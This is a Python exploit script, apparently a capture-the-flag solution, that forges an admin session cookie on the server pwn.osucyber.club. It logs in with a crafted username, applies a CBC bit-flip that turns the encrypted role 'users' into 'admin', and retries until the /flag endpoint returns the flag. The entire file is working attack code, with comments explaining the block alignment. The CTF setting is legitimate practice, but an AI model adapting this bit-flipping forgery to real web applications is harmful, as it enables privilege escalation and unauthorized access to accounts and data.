#!/usr/bin/python3.8

import base64
import json
import re
import time
from itertools import chain
import requests
from typing import List

TARGET_URL = "http://pwn.osucyber.club:13376"


def split_blocks(data: bytes, blocksize: int = 16) -> List[bytes]:
	return [data[s : s + blocksize] for s in range(0, len(data), blocksize)]

def merge_blocks(blocks: List[bytes]) -> bytes:
	return bytes(chain.from_iterable(blocks))

def pkcs7(data: bytes, blocksize: int = 16) -> bytes:
	d = bytearray(data)
	padding_len = blocksize - len(d) % blocksize
	d.extend(padding_len for _ in range(padding_len))
	return bytes(d)

def get_cookie(name: str) -> str:
	res = requests.post(f"{TARGET_URL}/login", {"username": name}, allow_redirects=False)
	cookies = {c.name: c.value for c in res.cookies}
	return cookies.get('SESSIONID2', None)

def make_cleartext(name: str) -> bytes:
	session = {'name': name, 'role': 'users'}
	return pkcs7(json.dumps(session, separators=(',',':')).encode('ascii', errors='replace'))

def get_flag(cookie: str) -> str:
	res = requests.get(f"{TARGET_URL}/flag", cookies={'SESSIONID2': cookie}, allow_redirects=False)
	return re.findall(r'osuctf{.*}', res.text)

def xor_blocks(block1: bytes, block2: bytes) -> bytes:
	return bytes(b1 ^ b2 for b1, b2 in zip(block1, block2))

# Use JSON escaping to pass the 20 charater limits for name, line it up so an entire block
# preceeding the block with "users" is within a string value.
# This is what we're trying to change. "?" represents a block that will decrypt to garbage.

# IVIVIVIVIVIVIVIV{"name":"\"\"\"AAAAAAAAAAAAAAAAA","role":"users"}PPPPPPPPPPPPPPP
# #------IV------##-------1------##-------2------##-------3------##-------4------#
# IVIVIVIVIVIVIVIV{"name":"\"\"\"A????????????????","role":"admin"}PPPPPPPPPPPPPPP

# Normally it takes 5 to 6 tries on average to get a cookie that parses as valid json

# Try 25 times to be safe
for i in range(25):
	print(".", end='')

	cookie = base64.b64decode(get_cookie("\"\"\"AAAAAAAAAAAAAAAAA"))
	blocks = split_blocks(cookie)

	difference = xor_blocks(b'","role":"users"', b'","role":"admin"')

	blocks[2] = xor_blocks(blocks[2], difference)

	new_cookie = base64.b64encode(merge_blocks(blocks)).decode('ascii')
	if flags := get_flag(new_cookie):
		print(f"\nCookie: {new_cookie}")
		print(*flags, sep='\n')
		break

	time.sleep(0.25)



